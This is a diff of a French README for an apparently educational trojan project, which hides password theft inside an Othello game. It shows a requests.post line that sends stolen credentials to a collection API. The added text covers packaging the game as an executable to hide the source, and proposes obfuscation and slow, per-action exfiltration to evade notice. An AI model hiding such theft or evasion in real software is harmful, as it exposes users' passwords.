@@ -135,6 +135,9 @@ requests.post(API_URL + "/add", json={ "url": url, "username": username, "email"
 6. Affichage des mots de passe sur client web
 
 
+### Création d'un exécutable
+
+Afin de partager notre programme et que le code source ne soit pas visible, nous avons créer un exécutable grâce au package python `pyinstaller`. Après avoir installé ce package, il vous suffit d'exécuter la commande suivante : `pyinstaller othello_gui.py --onefile`. Un exécutable sera ainsi généré dans un nouveau dossier dist.
 
 ## Résultats
 
@@ -143,6 +146,12 @@ Notre troyen est dissumulé dans un jeu de plateau informatisé qui s'appelle *O
 Pour des raisons évidentes de confidentialité, cette application n'est pas déployée et ne fonctionne qu'en local afin d'éviter que ces mots de passe soient réellement publiés.
 
 Notre troyen n'est pour l'instant pas particulièrement discret. Nous n'avons pas cherché à optimiser cette partie. Cependant, il est efficace et démarre dans un thread différent du jeu dans lequel il est divulgué pour ne pas ralentir l'exécution du jeu et attirer l'attention du joueur.
+
+## Limitations et perspectives
+
+Nous aurions pu passer plus de temps sur la discrétion de notre troyen. Par exemple, obfusquer le code afin que ce soit compliqué de comprendre où sont envoyés les données et ce qui est volé à la cible.
+
+De plus, nous aurions pu mélanger notre troyen et la récupération de mot de passe au jeu othello. Par exemple : Ne pas tout récupérer d'un coup et tout publier mais ralentir le processus de vol de mot de passe et de envoyer un mot passe à chaque action de l'utilisateur dans le jeu pour camoufler les actions entreprises par notre troyen.
 
 ## Références
 
